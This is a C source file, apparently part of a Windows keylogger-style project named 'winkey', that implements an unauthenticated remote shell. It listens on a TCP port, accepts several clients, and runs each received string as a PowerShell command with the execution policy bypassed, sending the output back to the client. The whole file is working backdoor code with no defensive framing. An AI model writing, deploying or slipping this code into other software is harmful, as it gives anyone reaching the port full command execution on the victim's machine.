#include "winkey.h"

char    *CommandCpy(char *recvbuf)
{
    char    *pwshell = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ";
    size_t  len = strlen(pwshell) + strlen(recvbuf) + 3;
    char    *cmd = malloc(sizeof(char) * len);

    snprintf(cmd, len, "%s\"%s\"", pwshell, recvbuf);
    printf("cmd: %s\n", cmd);
    return (cmd);
}
int  init_socket(SOCKET *ListenSocket)
{
    int iResult = 0;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0 )
    {
        WSACleanup();
        return (-10);
    }

    *ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (*ListenSocket == INVALID_SOCKET)
    {
        freeaddrinfo(result);
        WSACleanup();
        return (-10);
    }
    iResult = bind(*ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        freeaddrinfo(result);
        closesocket(*ListenSocket);
        WSACleanup();
        return (-10);
    }
    freeaddrinfo(result);
    iResult = listen(*ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        closesocket(*ListenSocket);
        WSACleanup();
        return (-10);
    }
    return (iResult);
}

int remote_shell(void) 
{
    WSADATA wsaData;
    SOCKET  ListenSocket = INVALID_SOCKET;
    SOCKET  clients[MAX_CLIENTS];

    int     i = 0;
    int     iResult = 0;

    fd_set          readfds;
    struct timeval  timeout;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0)
        return (1);
    iResult = init_socket(&ListenSocket);
    if (iResult == -10)
        return (1);

    for (i = 0; i < MAX_CLIENTS; i++)
        clients[i] = INVALID_SOCKET;

    // Receive until the peer shuts down the connection
    while(1)
    {
            FD_ZERO(&readfds);
            FD_SET(ListenSocket, &readfds);

            for (i = 0; i < MAX_CLIENTS; i++)
            {
                if (clients[i] != INVALID_SOCKET)
                    FD_SET(clients[i], &readfds);
            }
        
            timeout.tv_sec = 30;
            timeout.tv_usec = 0;
        
            int activity = select(0, &readfds, NULL, NULL, &timeout);
        
            if (activity == SOCKET_ERROR)
                break;
            if (FD_ISSET(ListenSocket, &readfds))
            {
                SOCKET newSocket = accept(ListenSocket, NULL, NULL);
                if (newSocket != INVALID_SOCKET)
                {
                    for (i = 0; i < MAX_CLIENTS; i++)
                    {
                        if (clients[i] == INVALID_SOCKET)
                        {
                            clients[i] = newSocket;
                            printf("New client: %d\n", newSocket);
                            break ;
                        }
                    }
                }

            }

        for (i = 0; i < MAX_CLIENTS; i++)
        {
            SOCKET s = clients[i];
            if (s != INVALID_SOCKET && FD_ISSET(s, &readfds))
            {
                char recvbuf[DEFAULT_BUFLEN];
                int ret = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);

                if (ret <= 0)
                {
                    printf("Client disconnected\n");
                    closesocket(s);
                    clients[i] = INVALID_SOCKET;
                    continue;
                }

                recvbuf[ret] = 0;

                char *cmd = CommandCpy(recvbuf);
                FILE *pPipe = _popen(cmd, "r");
                free(cmd);

                char output[4096] = {0};
                char psBuffer[512];

                if (pPipe)
                {
                    while (fgets(psBuffer, sizeof(psBuffer), pPipe))
                    {
                        size_t len = strlen(output); // longueur actuelle
                        if (len < sizeof(output))
                        {
                            snprintf(
                                output + len,          // écrire à la fin
                                sizeof(output) - len,  // espace restant
                                "%s",                  // format littéral
                                psBuffer
                            );
                        }
                        else
                        {
                            break; // buffer plein
                        }
                    }

                }

                send(s, output, (int)strlen(output), 0);
            }
        }
    }
    return (0);
}